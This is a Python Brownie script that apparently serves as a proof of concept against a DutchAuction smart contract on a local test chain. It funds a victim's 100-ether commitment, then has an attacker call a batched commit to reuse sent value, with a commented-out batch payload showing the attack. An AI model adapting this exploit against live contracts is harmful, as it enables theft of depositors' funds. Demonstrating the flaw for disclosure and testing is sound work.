from brownie import *
import time
import math

# Calculated variables
AUCTION_DAYS = 7
AUCTION_START = int(time.time())   # Few minutes to deploy
AUCTION_END = AUCTION_START + 60 * 60 * 24 * AUCTION_DAYS

ZERO_ADDRESS = '0x0000000000000000000000000000000000000000'
ETH_ADDRESS = '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE'

def main():
    deployer = accounts[0]
    attacker = accounts[1]
    funder = wallet = accounts[2]
    victim = accounts[3]

    weth = WETH9.deploy({'from': deployer})
    dutch_auction = DutchAuction.deploy({"from": deployer})

    weth.deposit({'from': funder, 'value': Wei("100 ether")})
    weth.approve(dutch_auction, Wei("50 ether"), {"from": funder})

    dutch_auction.init('', {"from": deployer})
    dutch_auction.initAuction(funder, weth, Wei("10 ether"), 
        AUCTION_START, AUCTION_END, ETH_ADDRESS, 
        Wei("2 ether"), Wei("1 ether"), deployer, ZERO_ADDRESS, wallet, {"from": deployer})

    print("Victim balance before commitEth:", victim.balance().to('ether'))
    dutch_auction.commitEth(victim, True, {"from": victim, "value": Wei('100 ether')})
    print("Victim balance after commitEth:", victim.balance().to('ether'))
    balance = math.floor(dutch_auction.balance().to('ether'))
    print("DutchAuction balance after victim commit:", dutch_auction.balance().to('ether'))
    
    ethToTransfer = dutch_auction.calculateCommitment(Wei(str(balance) + " ether"))
    assert ethToTransfer == 0

    print("Attacker balance before:", attacker.balance().to('ether'))
    # payload = dutch_auction.commitEth.encode_input(attacker, True)
    # dutch_auction.batch([payload, payload], True, {'from': attacker, 'value': Wei(str(balance) + " ether")})
    dutch_auction.batchCommitEthTest(attacker, {'from': attacker, 'value': Wei(str(balance) + " ether")})
    print("Attacker balance after:", attacker.balance().to('ether'))

